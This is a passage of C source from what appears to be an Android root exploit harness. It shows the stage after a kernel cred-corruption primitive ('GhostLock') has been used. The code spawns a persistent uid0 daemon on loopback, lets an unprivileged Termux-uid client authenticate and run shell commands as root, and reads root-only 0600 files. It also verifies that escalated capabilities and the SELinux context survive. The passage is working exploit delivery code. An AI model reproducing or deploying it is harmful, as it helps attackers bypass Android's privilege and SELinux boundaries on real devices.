     * uid=gid=(uid_t)-1, pid=0 on Linux), so the channel is protected by the
     * 32-byte secret in a 0600 Termux-owned file plus a loopback-only bind --
     * never by a TCP uid whitelist.  The uid whitelist (default 10369) is the
     * legacy AF_UNIX channel's gate. */
    res("ZD_ALLOW_OBSERVED", 1,
        "ALLOW audit lines=%d (0 is normal: the Termux client runs after this "
        "process exits; auth=%s, loopback-only, fail-closed after 3 bad "
        "secrets)", allows,
        g_zd_chan == 2 ? "secret-file" : "ZD1 secret first line");

    if (have_listen && listen_uid != 0) {
        /* fail-closed: a non-root daemon is not the deliverable */
        zd_fail_gate("LISTEN_UID_NOT_ROOT", "pid=%d listen_uid=%d euid=%d "
                     "(want uid=0; a non-root listener is NOT delivered)",
                     (int)p, listen_uid, listen_euid);
        res("ZD_LISTEN_UID0", 0, "listen_uid=%d euid=%d (want 0)",
            listen_uid, listen_euid);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
        g_zd_pid = -1;
        return -1;
    }
    if (have_listen && rc != 0) {
        /* unreachable with the fixed loop; keep the invariant explicit: a
         * LISTENING daemon is never killed for a bookkeeping failure. */
        L("ZD: LISTENING seen but rc=%d -- keeping the daemon (never kill a "
          "listening rootd)", rc);
        rc = 0;
    }
    if (rc != 0) {
        int st = 0;
        pid_t w = waitpid(p, &st, WNOHANG);
        if (w == p) {
            zd_fail_gate("NO_LISTEN_DAEMON_EXITED",
                         "pid=%d exited before ROOTD|LISTENING (status=0x%x "
                         "exit=%d); see the ROOTD| lines above",
                         (int)p, st, WIFEXITED(st) ? WEXITSTATUS(st) : -1);
        } else if (eof) {
            zd_fail_gate("NO_LISTEN_STDOUT_EOF",
                         "pid=%d closed stdout before ROOTD|LISTENING", (int)p);
        } else if (read_errno || poll_errno) {
            zd_fail_gate("NO_LISTEN_IO_ERROR",
                         "pid=%d read_errno=%d poll_errno=%d", (int)p,
                         read_errno, poll_errno);
        } else {
            zd_fail_gate("NO_LISTEN_TIMEOUT",
                         "%ds elapsed without ROOTD|LISTENING (pid=%d); check "
                         "the ROOTD|FATAL/ABORT lines (secret, bind, policy)",
                         g_zd_listen_timeout_s, (int)p);
        }
        /* a failed channel must not poison the main chain: the daemon is
         * stopped and the caller decides */
        kill(p, SIGKILL);
        if (w != p) waitpid(p, NULL, 0);
        g_zd_pid = -1;
    }
    return rc;
}

/* zd delivery: no delta gate, no load_policy, no unix C1 listener */
/* i701: one predicate for "stop right after a verified delivery channel", so
 * the three stage spellings cannot drift apart (host UT covers it). */
int zd_stop_stage_wanted(void)
{
    return g_stop_after != NULL &&
           (!strcmp(g_stop_after, "deliver-fork") ||
            !strcmp(g_stop_after, "deliver-tcp") ||
            !strcmp(g_stop_after, "deliver-file"));
}

/* ===== i706: in-process Termux-shaped client self-test ====================
 * The real Termux client is a separate, human-started step.  For the device
 * evidence run the uid0 parent forks a child, drops it to g_zd_secret_uid
 * (10369; the SELinux SID stays u:r:shell:s0), reads the 0600 Termux-owned
 * secret and drives the SAME wire protocol zd_repl.py uses.  This proves the
 * channel is usable by a 10369 process without a human in the loop; it is a
 * supplementary probe, not a substitute for the paste-ready Termux block.
 *
 *   I                     -> identity of the uid0 daemon
 *   R /data/system/entropy.dat
 *                         -> the daemon itself (still uid0 + CapEff V, no
 *                            execve) reads a 0600 file the shell cannot
 *   X /system/bin/sh -c   -> 3 REPL commands.  NOTE: --no-ambient means the
 *                            exec'd shell gets pE' = pA' = 0 on C.53
 *                            (cap_bprm_set_creds), so these are uid0 but
 *                            capless; privileged reads go through R.
 * ========================================================================== */
/* i775: same-family audit of the 10369 handshake path.  A signal (SIGCHLD,
 * SIGALRM, ...) can interrupt write()/read(); glx_p11m treated that as a hard
 * failure, which is indistinguishable from a real auth/transport failure.
 * EINTR is retried; only a genuine EOF/error ends the transfer. */
static int zdcl_wr(int fd, const void *b, unsigned n)
{
    const char *p = (const char *)b;
    while (n) {
        ssize_t r = write(fd, p, n);
        if (r > 0) { p += r; n -= (unsigned)r; continue; }
        if (r < 0 && errno == EINTR) continue;
        return -1;
    }
    return 0;
}
static int zdcl_rd(int fd, void *b, unsigned n)
{
    char *p = (char *)b;
    while (n) {
        ssize_t r = read(fd, p, n);
        if (r > 0) { p += r; n -= (unsigned)r; continue; }
        if (r < 0 && errno == EINTR) continue;
        return -1;
    }
    return 0;
}
static int zdcl_frame(int s, unsigned char t, const void *pl, unsigned n,
                      unsigned char *st, char *out, int outsz)
{
    unsigned char h[5];
    unsigned int rl;
    h[0] = t; h[1] = (unsigned char)(n & 0xff); h[2] = (unsigned char)((n >> 8) & 0xff);
    h[3] = (unsigned char)((n >> 16) & 0xff); h[4] = (unsigned char)((n >> 24) & 0xff);
    if (zdcl_wr(s, h, 5) != 0) return -1;
    if (n && zdcl_wr(s, pl, n) != 0) return -1;
    if (zdcl_rd(s, h, 5) != 0) return -1;
    *st = h[0];
    rl = (unsigned)h[1] | ((unsigned)h[2] << 8) | ((unsigned)h[3] << 16) |
         ((unsigned)h[4] << 24);
    if (rl >= (unsigned)outsz) rl = (unsigned)outsz - 1;
    if (rl && zdcl_rd(s, out, rl) != 0) return -1;
    out[rl] = 0;
    return 0;
}
/* i775: the handshake probe is DIAGNOSTIC.  Map its exit codes to the exact
 * failing door so a device log never ends at a bare "selftest FAIL". */
static const char *zdcl_reason(int ec)
{
    switch (ec) {
    case 11: return "DROP_TO_CLIENT_UID_FAILED";
    case 12: return "SECRET_OPEN_FAILED";
    case 13: return "SECRET_EMPTY";
    case 14: return "SOCKET_FAILED";
    case 15: return "CONNECT_10369_REFUSED";
    case 16: return "SECRET_SEND_FAILED";
    case 17: return "AUTH_GREETING_TIMEOUT";
    case 18: return "AUTH_DENIED";
    case 19: return "IDENT_FRAME_FAILED";
    case 1:  return "PROBE_MISMATCH(ident/entropy/REPL)";
    case 0:  return "ok";
    default: return ec < 0 ? "KILLED_OR_TIMEOUT" : "UNKNOWN";
    }
}

static int zd_client_selftest(void)
{
    pid_t p;
    int st = 0;
    uid_t uid = (g_zd_secret_uid >= 0) ? (uid_t)g_zd_secret_uid : (uid_t)10369;
    time_t t0;

    p = fork();
    if (p < 0) { res("ZD_CLIENT_SELFTEST", 0, "fork errno=%d", errno); return -1; }
    if (p == 0) {
        int s, ok = 1, i, port = g_zd_port_live > 0 ? g_zd_port_live : g_zd_port;
        int repl_ok = 0;
        char sec[128];
        int fd, k, nsec = 0;
        struct sockaddr_in a;
        unsigned char stb;
        char out[16384];
        struct timeval tv;
        char pl[700];
        unsigned pln;
        const char *cmds[3] = { "id", "echo REPL-3",
                                "cat /proc/sys/kernel/random/boot_id" };

        tv.tv_sec = 8; tv.tv_usec = 0;
        (void)syscall(SYS_setgroups, 0, NULL);
        if (setresgid(uid, uid, uid) != 0 || setresuid(uid, uid, uid) != 0) {
            L("ZDCL DROP_FAIL errno=%d (want uid=%u)", errno, (unsigned)uid);
            printf("GLX|ZDCONNECT|FAIL|reason=drop_uid|uid=%u|errno=%d\n",
                   (unsigned)uid, errno);
            fflush(stdout);
            _exit(11);
        }
        fd = open(g_zd_secret_file, O_RDONLY | O_CLOEXEC);
        if (fd < 0) {
            L("ZDCL SECRET_FAIL errno=%d path=%s", errno, g_zd_secret_file);
            printf("GLX|ZD_SECRET|FAIL|reason=open|path=%s|errno=%d\n",
                   g_zd_secret_file, errno);
            fflush(stdout);
            _exit(12);
        }
        k = (int)read(fd, sec, sizeof(sec) - 1);
        close(fd);
        if (k <= 0) {
            L("ZDCL SECRET_EMPTY");
            printf("GLX|ZD_SECRET|FAIL|reason=empty|path=%s\n", g_zd_secret_file);
            fflush(stdout);
            _exit(13);
        }
        sec[k] = 0;
        while (nsec < k && sec[nsec] != '\n' && sec[nsec] != '\r') nsec++;
        sec[nsec] = 0;
        L("ZDCL uid=%d secret_len=%d path=%s", (int)getuid(), nsec, g_zd_secret_file);
        printf("GLX|ZD_SECRET|PASS|len=%d|path=%s|uid=%d\n", nsec,
               g_zd_secret_file, (int)getuid());
        fflush(stdout);
        s = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
        if (s < 0) {
            printf("GLX|ZDCONNECT|FAIL|reason=socket|errno=%d\n", errno);
            fflush(stdout);
            _exit(14);
        }
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        memset(&a, 0, sizeof(a));
        a.sin_family = AF_INET;
        a.sin_port = htons((unsigned short)port);
        a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        if (connect(s, (struct sockaddr *)&a, sizeof(a)) != 0) {
            L("ZDCL CONNECT_FAIL port=%d errno=%d", port, errno);
            printf("GLX|ZDCONNECT|FAIL|port=%d|errno=%d\n", port, errno);
            fflush(stdout);
            _exit(15);
        }
        printf("GLX|ZDCONNECT|PASS|port=%d|uid=%d\n", port, (int)getuid());
        fflush(stdout);
        {
            char line[192];
            int m = snprintf(line, sizeof(line), "ZD1 %s\n", sec);
            if (zdcl_wr(s, line, (unsigned)m) != 0) _exit(16);
        }
        {
            char g[8];
            unsigned gi = 0;
            while (gi < sizeof(g) - 1) {
                if (zdcl_rd(s, g + gi, 1) != 0) _exit(17);
                if (g[gi++] == '\n') break;
            }
            g[gi] = 0;
            if (strcmp(g, "OK\n") != 0) { L("ZDCL AUTH_FAIL greeting=%s", g); _exit(18); }
            L("ZDCL AUTH OK");
        }
        if (zdcl_frame(s, 'I', NULL, 0, &stb, out, sizeof(out)) != 0) _exit(19);
        L("ZDCL IDENT st=%u %s", stb, out);
        printf("GLX|ZD_UID|%s|st=%u|%s\n",
               (stb == 0 && strstr(out, "uid=0") != NULL) ? "PASS" : "FAIL",
               stb, out);
        fflush(stdout);
        if (stb != 0 || strstr(out, "uid=0") == NULL) ok = 0;
        {
            char rp[128];
            int rn = snprintf(rp, sizeof(rp), "%s", "/data/system/entropy.dat") + 1;
            if (zdcl_frame(s, 'R', rp, (unsigned)rn, &stb, out, sizeof(out)) == 0) {
                L("ZDCL RD_ENTROPY st=%u len=%u", stb, (unsigned)strlen(out));
                if (stb != 0 || out[0] == 0) ok = 0;
            } else ok = 0;
        }
        for (i = 0; i < 3; i++) {
            pln = 0;
            memcpy(pl + pln, "/system/bin/sh", 15); pln += 15;
            memcpy(pl + pln, "-c", 3); pln += 3;
            {
                size_t cl = strlen(cmds[i]);
                if (pln + cl + 3 > sizeof(pl)) { ok = 0; break; }
                memcpy(pl + pln, cmds[i], cl); pln += (unsigned)cl;
            }
            pl[pln++] = 0;
            pl[pln++] = 0;
            if (zdcl_frame(s, 'X', pl, pln, &stb, out, sizeof(out)) != 0) { ok = 0; break; }
            printf("GLX|ZDCL|CMD%d st=%u\n%s\n", i, stb, out);
            if (stb == 0 && strstr(out, "\nrc=0\n") != NULL) repl_ok++;
            printf("GLX|ZD_REPL|cmd=%d|st=%u|ok=%d|out1=%.*s\n", i, stb,
                   (stb == 0 && strstr(out, "\nrc=0\n") != NULL) ? 1 : 0,
                   (int)strcspn(out, "\n"), out);
            fflush(stdout);
            if (stb != 0 || strstr(out, "\nrc=0\n") == NULL) ok = 0;
        }
        printf("GLX|ZD_REPL|SUMMARY|n=%d|ok=%d|want=3\n", i, repl_ok);
        fflush(stdout);
        {
            unsigned char sb;
            char b[32];
            (void)zdcl_frame(s, 'Q', NULL, 0, &sb, b, sizeof(b));
        }
        close(s);
        printf("GLX|ZDCL|SELFTEST|%s|uid=%d|port=%d|cmds=%d\n",
               ok ? "PASS" : "FAIL", (int)getuid(), port, 3);
        fflush(stdout);
        _exit(ok ? 0 : 1);
    }
    t0 = time(NULL);
    for (;;) {
        pid_t r = waitpid(p, &st, WNOHANG);
        if (r == p) break;
        if (time(NULL) - t0 > 40) { kill(p, SIGKILL); waitpid(p, &st, 0); break; }
        msleep(50);
    }
    {
        int ok = WIFEXITED(st) && WEXITSTATUS(st) == 0;
        int ec = WIFEXITED(st) ? WEXITSTATUS(st) : -1;
        printf("GLX|ZD_CLIENT_SELFTEST|%s|uid=%u|exit=%d|reason=%s\n",
               ok ? "PASS" : "FAIL", (unsigned)uid, ec, zdcl_reason(ec));
        if (ok) {
            /* i770 criteria compatibility: the RES|PASS row with its original
             * wording (entropy.dat / REPL cmds) is emitted ONLY on success, so
             * it never adds to g_fails and never trips pa_no_res_fail. */
            res("ZD_CLIENT_SELFTEST", 1,
                "termux-shaped uid=%u client: auth + R(entropy.dat) + 3 REPL "
                "cmds (exit=0)", (unsigned)uid);
        } else {
            printf("GLX|ZD_REPL|SUMMARY|n=-1|ok=-1|want=3\n");
        }
        fflush(stdout);
        L("ZD_CLIENT_SELFTEST %s uid=%u exit=%d (%s) -- supplementary probe; "
          "the rootd channel itself is already LISTENING and is KEPT",
          ok ? "PASS" : "FAIL", (unsigned)uid, ec, zdcl_reason(ec));
        return ok ? 0 : -1;
    }
}

static int zd_delivery(void)
{
    int rc;
    if (getuid() != 0 || geteuid() != 0) {
        res("ZD_UID0", 0, "uid=%d euid=%d (delivery needs uid0 first)",
            getuid(), geteuid());
        return -1;
    }
    res("ZD_UID0", 1, "uid=%d euid=%d (shell SID is expected to stay)",
        getuid(), geteuid());
    rc = zd_spawn_verify();
    if (rc != 0) return -1;
    if (g_zd_client_selftest) {
        if (zd_client_selftest() != 0) {
            /* i775: NEVER turn a working uid0 daemon into a failed boot.  The
             * channel deliverable is ROOTD|LISTENING uid=0; the handshake
             * probe is supplementary evidence.  Record the exact door and
             * keep the daemon for the Termux fallback. */
            zd_fail_gate("CLIENT_HANDSHAKE", "rootd LISTENING uid0 is up but "
                         "the uid-%d self-test failed (see ZDCL exit code); "
                         "daemon KEPT, Phase B continues",
                         g_zd_secret_uid >= 0 ? g_zd_secret_uid : 10369);
            zd_persist_note("client_selftest_fail");
        }
    }
    if (zd_stop_stage_wanted()) {
        g_stop_hit = 1;
        return 0;
    }
    return 0;
}

/* ------------------------------------------------------------- delivery run */
/* v4 C1: a real external u:r:untrusted_app_27 client (Termux in the field)
 * connects to the shell-labelled abstract socket.  The only policy row that
 * makes this work is the connectto row of the delivery delta.  The harness
 * client also reports its pre-delta attempt (must be -13) and its
 * UA27->kernel / UA27->init negative controls (must be -13). */
static int c1_external(struct chain *C)
{
    int pre = -999, base_after = -999, negk = -999, negi = -999;
    int post_report = -999, post_chan = -999;
    char buf[512], sec[256];

    (void)C;
    /* item ②: print the whole worst path once, so a device log shows exactly
     * which bound was hit instead of a bare 13 s mystery. */
    L("C1 timeout budget: accept_poll=%dms report_recv=%dms -> child %dms ; "
      "post_poll=%dms post_recv=%dms -> child %dms ; parent %dms (margins %d/%d)",
      C1_ACCEPT_POLL_MS, C1_REPORT_RECV_MS, C1_ACCEPT_WORST_MS,
      C1_POST_POLL_MS, C1_POST_RECV_MS, C1_POST_WORST_MS, READER_TIMEOUT_MS,
      READER_TIMEOUT_MS - C1_ACCEPT_WORST_MS, READER_TIMEOUT_MS - C1_POST_WORST_MS);
    /* glx_p6 item ③ (594 C-3): no UA27 client must NOT burn a GhostLock run.
     * This used to be res(C1_ACCEPT, 0) -> g_fails++ -> DELIVERY_FAIL even
     * though the chain itself was fine.  It is now a SKIP (res 1) and the
     * RESULT line says c1_shell=SKIP. */
    if (reader_request(V4_OP_C1, 0) != 0) {
        /* item ②: a parent-side timeout is a SKIP too, and the child must be
         * drained before the next op (NEG/STOP) is queued -- otherwise the
         * C1 timeout would turn into a Phase-B gate failure, i.e.
         * exactly the DELIVERY_FAIL we must never produce for C1. */
        L("C1 accept window overran the parent budget (%d ms); draining reader",
          READER_TIMEOUT_MS);
        if (reader_wait_idle(C1_IDLE_WAIT_MS) != 0)
            L("C1 reader still busy after %d ms (later ops will queue)",
              C1_IDLE_WAIT_MS);
        g_c1_shell = "SKIP";
        res("C1_SKIP", 1, "no u:r:untrusted_app_27 client within the accept "
            "window (parent timeout %d ms) -- C1 is an evidence dimension, not "
            "a root gate (policy_static evidence only)", READER_TIMEOUT_MS);
        return 0;
    }
    sec[0] = 0;
    if (g_rq->child_ctx[0]) { strncpy(sec, g_rq->child_ctx, sizeof(sec) - 1); sec[sizeof(sec)-1] = 0; }
    if (g_rq->c1_rc != 0) {
        g_c1_shell = "SKIP";
        res("C1_SKIP", 1, "shell daemon accept failed rc=%d (no client) -- "
            "not a root failure", g_rq->c1_rc);
        return 0;
    }
    res("C1_ACCEPT", 1,
        "shell-domain daemon accepted UA27 (peer uid=%d pid=%d sid=%s)",
        g_rq->peer_uid, g_rq->peer_pid, sec);
    L("C1 peer uid=%d pid=%d sid=%s", g_rq->peer_uid, g_rq->peer_pid, sec);
    if (g_rq->n > 0) {
        strncpy(buf, (const char *)g_rq->out, sizeof(buf) - 1);
        buf[sizeof(buf)-1] = 0;
        L("C1 client report='%.200s'", buf);
    } else {
        buf[0] = 0;
        L("C1 client report read rc=%d", g_rq->n);
    }
    {
        char *p;
        if ((p = strstr(buf, "PRE=")))        pre = atoi(p + 4);
        if ((p = strstr(buf, "BASE_AFTER="))) base_after = atoi(p + 11);
        if ((p = strstr(buf, "NEGK=")))       negk = atoi(p + 5);
        if ((p = strstr(buf, "NEGI=")))       negi = atoi(p + 5);
        /* item ①/②: an old client can only embed POST= in the first report.
         * The authoritative value comes from the second connection below. */
        if (c1_parse_post(buf, &post_report))
            L("C1 POST= found in the first report: %d (old-client path)", post_report);
    }
    snprintf(g_rq->reply, sizeof(g_rq->reply), "OK uid=%d peer=%s\n", getuid(), sec);
    if (reader_request(V4_OP_C1_REPLY, 0) != 0)
        L("C1 reply handoff to the shell daemon timed out");
    /* item ①: the daemon has now written the reply and waited for the client's
     * one extra connection.  -999 means no POST= arrived => PARTIAL. */
    post_chan = g_rq->c1_post;
    g_c1_post_src = g_rq->c1_post_src;
    g_c1_post = c1_post_select(post_chan, post_report);
    if (g_c1_post_src == 0 && post_report != -999) g_c1_post_src = 2;
    L("C1 POST channel: second-conn rc=%d src=%d ; first-report rc=%d => post=%d",
      post_chan, g_rq->c1_post_src, post_report, g_c1_post);

    res("C1_PEER_UA27", strstr(sec, "untrusted_app_27") != NULL, "peer=%s", sec);
    res("C1_BASE_DENIED", pre == -13, "client pre-delta connect rc=%d (want -13)", pre);
    /* item ②: a base-probe success can land inside the N9..L1 permissive window
     * (the client polls), so it is only PARTIAL evidence -- never LIVE. */
    res("C1_BASE_AFTER_DELTA", base_after == 0,
        "client base-probe connect after delta rc=%d (want 0) -- PARTIAL only, "
        "may have landed in the N9..L1 permissive window", base_after);
    /* item ② (594 C-4): kernel/init can only ever be policy_static evidence
     * (no listener => unix_find_other() refuses before the LSM hook, fact 593).
     * A *successful* connect (rc==0) is still a real hole and must FAIL. */
    if (negk == 0)
        res("C1_KERNEL_STATIC", 0, "UA27->kernel connect rc=0 (delta opened it!)");
    else
        res("C1_KERNEL_STATIC", 1, "UA27->kernel rc=%d; evidence=STATIC "
            "(not measurable live)", negk);
    if (negi == 0)
        res("C1_INIT_STATIC", 0, "UA27->init connect rc=0 (delta opened it!)");
    else
        res("C1_INIT_STATIC", 1, "UA27->init rc=%d; evidence=STATIC "
            "(not measurable live)", negi);
    /* item ①②: the live evidence row.  ONLY a POST=0 that arrived on the
     * second connection is LIVE.  -999 (nothing reported) or a POST= that only
     * came inside the first report is PARTIAL, carried on the RESULT line and
     * never silently upgraded; a reported non-zero rc is a real finding. */
    g_c1_shell = c1_shell_verdict(g_c1_post, g_c1_post_src);
    if (g_c1_post == 0 && g_c1_post_src == 1)
        res("C1_SHELL_ENFORCED", 1, "second-connection POST=0 => LIVE evidence "
            "that UA27->shell connectto works under enforcing=1");
    else if (g_c1_post == 0 && g_c1_post_src == 2)
        res("C1_SHELL_PARTIAL", 1, "POST=0 only inside the first report (old "
            "client, no second connect) => PARTIAL, not LIVE");
    else if (g_c1_post == -999)
        res("C1_SHELL_PARTIAL", 1, "client did not report POST= => PARTIAL "
            "(delta effectiveness under enforcing is NOT live-proven)");
    else
        res("C1_SHELL_ENFORCED", 0, "post-reply connect rc=%d => delta row did "
            "NOT take effect under enforcing=1", g_c1_post);
    res("C1_UID0", getuid() == 0 && geteuid() == 0, "daemon uid=%d euid=%d",
        getuid(), geteuid());
    return 0;
}

/* glx_p6 item ④: the post-root negative control gets its own verdict, and
 * "the fixture is missing" is UNKNOWN -- never a pass (P2 spirit, 607②).
 *   -13 => DENIED  (SELinux still refuses dropbox_data_file for shell: good)
 *    -2 => UNKNOWN (path absent; nothing was proven either way)
 *   else=> FAIL    (an unexpected rc; a success means the delta opened a hole) */
/* ===== i730 (intent 733): the Phase-B evidence predicates ================
 * A/B: the pre-cred shell identity must be DENIED on the SAME file the
 * post-cred uid0 identity reads.  "Denied" is EACCES (-13) from open()/read()
 * under the DAC口径 -- a directory read returns EISDIR (-21) and a missing
 * file ENOENT (-2), and neither is an access-control verdict.  That is
 * exactly the misjudgement fact 732 caught in glx_p11f. */
static int vr_ab_ok(int pre_rc, int post_ok, int same_path)
{
    return same_path && pre_rc == -13 && post_ok != 0;
}

/* Identity/pose frame of the uid0 process.  Every capability number here
 * comes from capget(2) / prctl(2); no GhostLock read is ever used (a
 * read_window(A) would side-store at A-8 and corrupt the cred). */
struct vr_pose_s {
    const char *ctx;        /* /proc/self/attr/current            */
    const char *enforce;    /* /sys/fs/selinux/enforce, read back  */
    unsigned long eff;      /* capget(2) cap_effective            */
    unsigned long bnd;      /* prctl(PR_CAPBSET_READ) cap_bset    */
    unsigned long bnd_pre;  /* pre-cred baseline (advisory delta)  */
    int have_bnd_pre;
    unsigned long secbits;  /* prctl(PR_GET_SECUREBITS)           */
    unsigned long secbits_pre;
    int have_secbits_pre;
};

#define VR_CAP_LAST_CAP 37UL   /* C.53 kernel 5.4 CAP_LAST_CAP */
#define VR_POSE_BITS    0xC6UL /* SETGID|SETUID|DAC_OVERRIDE|DAC_READ_SEARCH */

static int vr_pose_ok(const struct vr_pose_s *p)
{
    if (!p->ctx || !strstr(p->ctx, DOM_SHELL)) return 0;
    if (!p->enforce || strcmp(p->enforce, "1") != 0) return 0;
    if ((p->eff & VR_POSE_BITS) != VR_POSE_BITS) return 0;
    if ((p->bnd & VR_POSE_BITS) != VR_POSE_BITS) return 0;
    /* "CapBnd 未越界": no bit above CAP_LAST_CAP.  Bits ADDED relative to
     * the pre-cred baseline are logged but are not a gate by themselves --
     * the bounding set is a kernel-side ceiling, and widening it is not an
     * access-control leak (the interesting direction is losing bits). */
    if ((p->bnd >> (VR_CAP_LAST_CAP + 1)) != 0) return 0;
    if (p->have_secbits_pre && p->secbits != p->secbits_pre) return 0;
    return 1;
}

static int delivery(struct chain *C)
{
    char b[256];
    int n;
    char vr_sel[256];          /* i730: path shared by A and B  */
    int vr_post_ok = 0;
    int vr_post_bytes = -1;

    /* intent 676: the delta leg stays DELETED.  With permissive_map.node
     * pointing at our pmsg page, security_load_policy() would eventually
     * policydb_destroy() the old policy and kmem_cache_free() that page ->
     * panic (fact 659 (5)).  enforcing is 1 on the PERM path, and on the
     * N9-fallback path it has already been restored through selinuxfs at the
     * end of do_chain(). */
    L("DELIVERY: no policy load and no delta by design (per-SID permissive "
      "forbids it); transport = %s",
      (g_zd_chan == 2) ? "file" : "127.0.0.1 TCP");
    if (g_zd_chan) {
        /* spawn the uid0 daemon (fork, no exec by default) and let the
         * operator's Termux client prove both connections */
        if (zd_delivery() != 0) return -1;
        if (g_stop_hit) {
            L("STOP_AFTER=%s: delivery channel verified; VR skipped on purpose",
              g_stop_after);
            return 0;
        }
    } else {
        /* legacy abstract-socket C1 needs the deleted delta; keep it as an
         * explicit SKIP, never a PASS. */
        L("C1_SKIP: the unix C1 leg needs the deleted delta; use --zd=tcp|file");
        res("C1_SKIP", 1, "delta leg deleted by design (not a PASS for C1)");
    }
    (void)C;

    /* ---------------- VR: post-exec cap_bset re-check + 0600 read ----------
     * Planner requirement (intent 576): never a single hard-coded path.
     *   1) pick the first existing regular 0600 file with a non-shell owner
     *      (root-owned preferred) from VR_CANDIDATES,
     *   2) its pre-root (uid 2000) read must have been denied (vr_pre_probe),
     *   3) execve the binary again (re-exec through /proc/self/exe) and assert
     *      cap_effective/cap_bset still carry the DAC bits and the SELinux
     *      context is still u:r:shell:s0 -- fact 572: execve rebuilds pP'/pE'
     *      from cap_bset, so this is the only honest W6 test,
     *   4) then the non-exec'd uid0 process reads the file directly.
     *
     * P9 (intent 598): keep this probe exactly as it is.  NEVER "repair" a
     * failed cap check by issuing another cap write AFTER execve: execve()
     * de_thread()s the process, which destroys the waiter-owning thread and
     * with it the futex ring / pi_state_cache -- the GhostLock primitive does
     * not exist after an exec.  The post-exec check is the only honest test.
     *
     * P2 (intent 598): a missing fixture is VR_TARGET_UNKNOWN and it is NOT a
     * pass: it is counted as "no evidence" (res 0 + vr=UNKNOWN on the RESULT
     * line), exactly like hint 483 item 2 requires. */
    {
        struct stat vst;
        int idx = -1, root_owned = 0, fd = -1, got = -1;
        const char *vt = NULL;
        char rb[64];
        char ctx[160] = {0};

        memset(&vst, 0, sizeof(vst));
        memset(rb, 0, sizeof(rb));
        self_ctx(ctx, sizeof(ctx));
        L("VR self ctx=%s uid=%d", ctx, getuid());
        if (rd_file("/sys/fs/selinux/enforce", b, sizeof(b)) >= 0)
            L("VR enforce=%s", b);

        if (g_vr_override) {
            if (stat(g_vr_target, &vst) == 0 && S_ISREG(vst.st_mode) &&
                (vst.st_mode & 0777) == 0600 && vst.st_size > 0) {
                vt = g_vr_target;
                root_owned = (vst.st_uid == 0);
            } else {
                L("VR --vr-target %s unusable, falling back to the candidate list",
                  g_vr_target);
            }
        }
        if (!vt) {
            int pre_rc = -999;
            char dyn[512];
            idx = vr_pick(dyn, sizeof(dyn), &vst, &root_owned, &pre_rc);
            if (idx >= 0) {
                vt = VR_CANDIDATES[idx];
            } else if (idx == -1) {
                vt = dyn;                       /* /data/anr fallback (fact 584) */
            }
        }
        if (!vt) {
            vr_report_unknown();
        } else {
            g_vr_verdict = "SELECTED";
            L("VR target=%s uid=%d mode=%04o size=%ld root_owned=%d idx=%d",
              vt, (int)vst.st_uid, vst.st_mode & 07777, (long)vst.st_size,
              root_owned, idx);
            res("VR_TARGET_SELECTED", 1, "%s uid=%d mode=%04o size=%ld root_owned=%d",
                vt, (int)vst.st_uid, vst.st_mode & 07777, (long)vst.st_size, root_owned);
            snprintf(vr_sel, sizeof(vr_sel), "%.255s", vt);   /* i730: A/B path */
            if (idx >= 0)
                res("VR_SHELL_PRE_DENIED", g_vr_pre_rc[idx] < 0,
                    "shell(uid2000) read %s rc=%d", vt, g_vr_pre_rc[idx]);
            else
                res("VR_SHELL_PRE_DENIED", 1,
                    "%s mode=0600 uid=%d -- DAC denies uid2000 by construction",
                    vt, (int)vst.st_uid);
            if (g_ambient) {
                char out[1024];
                int rc2 = vr_exec_check(vt, out, sizeof(out));
                unsigned long eff = 0, prm = 0, bnd = 0;
                char *p;
                if ((p = strstr(out, "eff="))) eff = strtoul(p + 4, NULL, 0);
                if ((p = strstr(out, "prm="))) prm = strtoul(p + 4, NULL, 0);
                if ((p = strstr(out, "bnd="))) bnd = strtoul(p + 4, NULL, 0);
                L("VR exec probe rc=%d out='%.400s'", rc2, out);
                /* P3: eff/prm/bnd must ALL carry the DAC bits after execve. */
                res("VR_EXEC_CAPBSET",
                    rc2 == 0 && (eff & CRED_CAP_BITS) == CRED_CAP_BITS &&
                    (prm & CRED_CAP_BITS) == CRED_CAP_BITS &&
                    (bnd & CRED_CAP_BITS) == CRED_CAP_BITS,
                    "post-exec eff=%#lx prm=%#lx bnd=%#lx (want bits %#lx)",
                    eff, prm, bnd, CRED_CAP_BITS);
                res("VR_EXEC_CAPPERM", rc2 == 0 &&
                    (prm & CRED_CAP_BITS) == CRED_CAP_BITS,
                    "post-exec cap_permitted=%#lx (want bits %#lx, P3)",
                    prm, CRED_CAP_BITS);
                res("VR_EXEC_DOMAIN", strstr(out, DOM_SHELL) != NULL,
                    "post-exec child ctx must be %s", DOM_SHELL);
            } else {
                /* --no-ambient is the fork-only tier: execve() rebuilds
                 * CapPrm/CapEff from the ambient set and would drop the DAC
                 * bits, so the probe is deliberately not attempted.  It is a
                 * SKIP, never a PASS. */
                res("VR_EXEC_SKIP", 1,
                    "--no-ambient fork-only tier: exec probe not attempted "
                    "(fork needs no bprm; uid0+CapEff survive)");
            }
            fd = open(vt, O_RDONLY);
            got = fd >= 0 ? read(fd, rb, sizeof(rb) - 1) : -1;
            if (fd >= 0) close(fd);
            L("VR uid0 direct read %s fd=%d bytes=%d '%.32s'", vt, fd, got, rb);
            vr_post_ok = (fd >= 0 && got > 0);      /* i730: B side of the A/B */
            vr_post_bytes = got;
            res("VR_ROOTONLY", fd >= 0 && got > 0, "uid0 open/read %s (bytes=%d)", vt, got);
            g_vr_verdict = (fd >= 0 && got > 0) ? "ROOTONLY" : "FAIL";
        }
    }
    /* ===== i730 (intent 733): corrected Phase-B evidence =================
     * The glx_p11f block read /data/system/dropbox and /init and insisted on
     * -13.  fact 732 measured -21 (EISDIR: it is a DIRECTORY, and uid0 with
     * CAP_DAC_OVERRIDE opens it) and 0 (this build's /init is a root:shell
     * 0750 symlink).  Neither was a policy leak; both assertions are gone.
     *
     * A/B: the reader child was forked BEFORE the cred stage, so it is a
     * live uid2000 / u:r:shell:s0 process.  It opens the SAME path the uid0
     * process just read.  EACCES (-13) there + a successful uid0 read here
     * is the evidence that the cred swap (not a policy hole) is what made
     * the file readable. */
    if (vr_sel[0]) {
        int req_ok = (reader_request(V4_OP_NEG, 0) == 0);
        int pre_rc = -999;
        const char *pre_src = "none";
        const char *reader_path = g_vr_target ? g_vr_target : DEV_VR_TARGET;
        int same_path = (strcmp(vr_sel, reader_path) == 0);

